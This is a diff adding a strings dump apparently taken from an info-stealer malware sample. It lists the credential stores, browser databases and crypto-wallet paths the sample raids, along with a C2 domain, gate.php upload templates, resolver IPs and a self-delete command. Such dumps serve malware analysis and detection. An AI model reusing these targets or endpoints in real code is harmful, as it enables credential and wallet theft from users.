@@ -1,0 +1,184 @@
+http://bendes.co.uk
+/lmpUNlwDfoybeulu
+4p81GSwBwRrAhCYK
+SQLite format 3
+2|NordVPN||%s|%s
+2|EarthVPN||%s|%s
+3|Psi(+)|%s|%s|%s
+3|Pidgin|%s|%s|%s
+4|Remote Desktop|%s|%s|%s
+1|TotalCommander|%s|%s|%s
+1|WinSCP|%s|%s|%s
+1|WS_FTP|%s|%s|%S
+1|FileZilla|%s:%s|%s|%S
+full address:s:
+username:s:
+password 51:b:
+Path
+config
+name
+.bit
+%08lX%04lX%lu
+screenshot.png
+Hostname
+Username
+Password
+TRUE
+FALSE
+quit
+EarthVPN
+NordVPN
+setting[@name='%s']
+user.config
+Valve\Steam
+Telegram
+Battle.net
+Skype
+main.db
+loginusers
+discord\Local Storage\https_discordapp.com_0.localstorage
+.config
+\tdata\
+psi
+profiles
+%s\.purple\%s
+accounts.xml
+Software
+Microsoft
+Cryptography
+InstallPath
+ProductName
+DisplayIcon
+DisplayName
+DisplayVersion
+{53F49750-6209-4FBF-9CA8-7A333C87D1ED}_is1
+MachineGuid
+Martin Prikryl\WinSCP 2\Sessions
+Internet Explorer\IntelliForms\Storage2
+Internet Explorer\TypedURLs
+Windows\CurrentVersion\Uninstall
+Windows NT\CurrentVersion
+Windows\CurrentVersion\Uninstall
+Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook
+Software\Microsoft\Office\%d.0\Outlook\Profiles\Outlook
+pstorec.dll
+vaultcli.dll
+Microsoft_WinInet_*
+abe2869f-9b47-4cd9-a358-c22904dba7f7
+B??K???A???JpM?(
+?T?<??K?`???;U
+recentservers
+sitemanager
+FileZilla
+Host
+User
+Pass
+Ipswitch\WS_FTP\Sites\ws_ftp.ini
+???????ixKZ-<4xV????
+GHISLER\wcx_ftp.ini
+0123456789ABCDEF
+HostName
+UserName
+UID
+PWD
+Port
+connections
+encoding
+Internet Explorer
+Cookies
+wininet.txt
+%s	TRUE	%s	%s	%d	%s	%s
+Login Data
+%s\%S.json
+webappsstore.sqlite
+formhistory.sqlite
+signons.sqlite
+cookies.sqlite
+logins
+encryptedUsername
+encryptedPassword
+key3.db
+key4.db
+%s\key%d.db
+Web Data
+176.126.70.119
+46.101.70.183
+188.165.200.156
+103.25.202.192
+178.32.31.41
+82.196.9.45
+87.98.175.85
+185.121.177.53
+92.222.80.28
+185.121.177.177
+169.239.202.202
+80.233.248.109
+78.138.97.93
+91.217.137.44
+5.135.183.146
+51.15.98.97
+dotbit.me
+GET
+POST
+%S %s HTTP/1.1\n%SContent-Length: %d
+%S/gate.php
+Content-Type: application/x-www-form-urlencoded\nHost: %S
+Content-Type: application/octet-stream\nContent-Encoding: binary\nHost: %S
+Host: %S
+monero-project
+wallet_path
+wallet.dat
+Crypto
+keystore
+.wallet
+Ethereum
+Electrum
+Namecoin
+strDataDir
+com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb\000003.log
+Exodus
+Grabber
+%FULLDISK%
+%NETWORK%
+/c ping 127.0.0.1 && del "%s"
+%02d-%02d-%02d %d:%02d:%02d
+MachineGuid: %S
+IP: %s
+CPU: %s (%d cores)
+RAM: %s MB
+Screen: %dx%d
+PC: %s
+ %s
+LT: %s (UTC+%d:%d)
+GPU:
+Layouts: 
+Software: 
+PWD
+CRED_DATA
+CREDIT_CARD
+AUTOFILL_DATA
+IMPAUTOFILL_DATA
+SYSINFORMATION
+FFFILEE
+__DELIMM__
+__GRABBER__
+runas
+open
+%ComSpec%
+wininet.dll
+winhttp.dll
+ws2_32.dll
+user32.dll
+shell32.dll
+advapi32.dll
+dnsapi.dll
+netapi32.dll
+gdi32.dll
+gdiplus.dll
+oleaut32.dll
+ole32.dll
+shlwapi.dll
+userenv.dll
+urlmon.dll
+crypt32.dll
+mpr.dll
